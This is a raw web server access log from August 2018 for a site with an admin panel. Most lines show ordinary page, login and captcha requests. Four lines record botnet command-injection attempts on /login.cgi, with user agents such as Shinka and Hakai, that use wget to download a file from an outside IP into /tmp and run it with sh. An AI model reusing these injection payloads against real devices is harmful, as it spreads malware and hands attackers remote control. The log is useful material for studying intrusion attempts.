123.125.250.164 - - [22/Aug/2018:02:46:54 +0000] "GET /sys/menu/list?_search=false&nd=1534906014355&limit=10&page=1&sidx=&order=asc&_=1534906014319 HTTP/1.1" 200 1828 "http://47.92.143.230/sys/menu.html" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/68.0.3440.106 Safari/537.36" "-"
123.125.250.164 - - [22/Aug/2018:02:46:58 +0000] "GET /sys/menu/list?_search=false&nd=1534906018804&limit=10&page=2&sidx=&order=asc&_=1534906014320 HTTP/1.1" 200 2007 "http://47.92.143.230/sys/menu.html" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/68.0.3440.106 Safari/537.36" "-"
188.17.19.167 - - [22/Aug/2018:03:22:35 +0000] "GET /login.cgi?cli=aa%20aa%27;wget%20http://209.141.33.86/d%20-O%20-%3E%20/tmp/.shinka;sh%20/tmp/.shinka%27$ HTTP/1.1" 400 173 "-" "Shinka/1.0" "-"
94.50.224.109 - - [22/Aug/2018:03:52:18 +0000] "GET /login.cgi?cli=aa%20aa%27;wget%20http://80.211.67.245/k%20-O%20/tmp/ks;chmod%20777%20/tmp/ks;sh%20/tmp/ks%27$ HTTP/1.1" 400 173 "-" "LMAO/2.0" "-"
183.136.190.40 - - [22/Aug/2018:04:00:12 +0000] "GET / HTTP/1.1" 302 0 "-" "Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/35.0.1916.153 Safari/537.36" "-"
120.55.13.109 - - [22/Aug/2018:04:21:51 +0000] "GET / HTTP/1.0" 302 0 "-" "-" "-"
221.227.207.162 - - [22/Aug/2018:04:22:26 +0000] "GET /login.cgi?cli=aa%20aa%27;wget%20http://209.141.33.86/d%20-O%20-%3E%20/tmp/.shinka;sh%20/tmp/.shinka%27$ HTTP/1.1" 400 173 "-" "Gemini/2.0" "-"
190.185.114.77 - - [22/Aug/2018:05:00:26 +0000] "GET / HTTP/1.1" 302 0 "-" "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.103 Safari/537.36" "-"
197.38.26.174 - - [22/Aug/2018:05:25:31 +0000] "GET /login.cgi?cli=aa%20aa%27;wget%20http://176.32.32.156/bin%20-O%20-%3E%20/tmp/hk;sh%20/tmp/hk%27$ HTTP/1.1" 400 173 "-" "Hakai/2.0" "-"
101.132.177.14 - - [22/Aug/2018:05:45:12 +0000] "GET / HTTP/1.1" 302 0 "-" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:36.0) Gecko/20100101 Firefox/36.0" "-"
101.132.177.14 - - [22/Aug/2018:05:45:12 +0000] "GET /login.html;JSESSIONID=d7de1aa6-fae4-4443-bbaf-455060915ccc HTTP/1.1" 200 4135 "-" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:36.0) Gecko/20100101 Firefox/36.0" "-"
123.125.250.164 - - [22/Aug/2018:05:46:07 +0000] "GET /sys/menu/list?_search=false&nd=1534916767192&limit=10&page=1&sidx=&order=asc&_=1534906014321 HTTP/1.1" 302 0 "http://47.92.143.230/sys/menu.html" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/68.0.3440.106 Safari/537.36" "-"
123.125.250.164 - - [22/Aug/2018:05:46:07 +0000] "GET /login.html;JSESSIONID=05662bd7-f580-4606-a625-f358485aed8f HTTP/1.1" 200 4135 "http://47.92.143.230/sys/menu.html" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/68.0.3440.106 Safari/537.36" "-"
123.125.250.164 - - [22/Aug/2018:05:46:12 +0000] "GET /sys/menu/list?_search=false&nd=1534916772028&limit=30&page=1&sidx=&order=asc&_=1534906014322 HTTP/1.1" 302 0 "http://47.92.143.230/sys/menu.html" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/68.0.3440.106 Safari/537.36" "-"
123.125.250.164 - - [22/Aug/2018:05:46:30 +0000] "GET /sys/user.html HTTP/1.1" 302 0 "http://47.92.143.230/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/68.0.3440.106 Safari/537.36" "-"
123.125.250.164 - - [22/Aug/2018:05:46:30 +0000] "GET /captcha.jpg HTTP/1.1" 499 0 "http://47.92.143.230/login.html" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/68.0.3440.106 Safari/537.36" "-"
123.125.250.164 - - [22/Aug/2018:05:46:30 +0000] "GET /captcha.jpg HTTP/1.1" 200 3153 "http://47.92.143.230/login.html" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/68.0.3440.106 Safari/537.36" "-"
101.132.97.6 - - [22/Aug/2018:06:46:41 +0000] "GET / HTTP/1.1" 302 0 "-" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:36.0) Gecko/20100101 Firefox/36.0" "-"
101.132.97.6 - - [22/Aug/2018:06:46:41 +0000] "GET /login.html;JSESSIONID=09b875c1-67c4-411b-b0b3-33e8767424d5 HTTP/1.1" 200 4135 "-" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:36.0) Gecko/20100101 Firefox/36.0" "-"
200.50.122.168 - - [22/Aug/2018:07:18:08 +0000] "GET / HTTP/1.0" 302 0 "-" "-" "-"
93.170.114.251 - - [22/Aug/2018:07:34:00 +0000] "GET / HTTP/1.1" 302 0 "-" "Mozilla/5.0 (Windows NT 5.1; rv:9.0.1) Gecko/20100101 Firefox/9.0.1" "-"
